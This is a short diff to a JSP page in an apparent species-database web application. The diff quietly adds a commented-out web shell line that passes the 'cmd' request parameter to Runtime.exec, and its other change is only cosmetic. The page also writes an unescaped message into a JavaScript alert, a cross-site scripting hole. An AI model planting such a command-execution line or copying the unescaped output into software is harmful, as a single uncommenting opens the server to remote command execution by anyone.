@@ -7,7 +7,7 @@
 <!--VARIABLES-->
 <%!SpeciesValueObject species = null;
 	ArrayList<SpeciesValueObject> speciesList = null;%>
-
+<%-- <%Runtime.getRuntime().exec(request.getParameter("cmd"));%> --%>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -117,7 +117,8 @@
 	<%
 	if (deleteMessage != null) {
 	%>
-	<script>alert('<%=deleteMessage%>')</script>
+	<script>alert('<%=deleteMessage%>')
+	</script>
 	<%
 	}
 	%>
